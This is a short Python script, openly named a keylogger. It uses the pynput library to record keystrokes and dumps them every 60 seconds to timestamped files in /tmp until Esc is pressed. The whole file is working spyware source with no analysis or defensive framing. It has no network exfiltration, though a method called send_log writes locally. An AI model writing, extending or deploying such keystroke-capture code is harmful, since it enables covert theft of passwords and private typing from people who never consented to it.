#!/usr/bin/env python3

import datetime
import threading
# from threading import Timer
from pynput import keyboard

log = ''

t = threading.Thread()

class Keylogger:

    def __init__(self):
                
        self.log = ''

    def start(self):

        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
            self.send_log()
            self.listener.join()

    def on_press(self, key):
        global log
        try:
            # print(f'{key.char} pressed.')
            self.log += key.char
        except AttributeError:
            # print(f'{key} pressed')
            if key == key.space:
                self.log += ' '
            elif key == key.enter:
                self.log += '\n'
                 
    
    def on_release(self, key):
        # print(f'{key} released.')
        if key == keyboard.Key.esc:
            t.cancel()
            return False # stop listener
    
    def send_log(self):
        global t
    
        time = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        with open(f'/tmp/keylogger_{time}.log', 'w') as f:
            f.write(self.log)
    
        self.log = ''
    
        t = threading.Timer(60.0, self.send_log)
        t.start()

def main():
    keylogger = Keylogger()
    keylogger.start()    

if __name__ == '__main__':
    main()
